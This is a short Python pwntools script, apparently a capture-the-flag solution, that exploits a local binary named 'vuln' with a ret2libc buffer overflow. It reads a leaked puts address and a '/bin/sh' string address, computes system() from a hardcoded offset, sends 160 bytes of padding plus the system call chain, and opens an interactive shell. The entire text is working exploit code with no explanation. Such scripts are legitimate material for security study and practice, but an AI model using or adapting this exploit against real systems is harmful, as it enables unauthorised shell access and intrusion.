from pwn import *
binary = process("vuln")
gdb_puts = 0xf7605140
gdb_system = 0xf75e0940
offset = gdb_puts - gdb_system
output = binary.recv()
puts = int(re.findall("puts: (.*)",output)[0],16)
bin_sh_str = int(re.findall("useful_string: (.*)",output)[0],16)
system = puts - offset
exploit = "A"*160
exploit += p32(system)
exploit += p32(0x90909090)
exploit += p32(bin_sh_str)
binary.sendline(exploit)
binary.interactive()
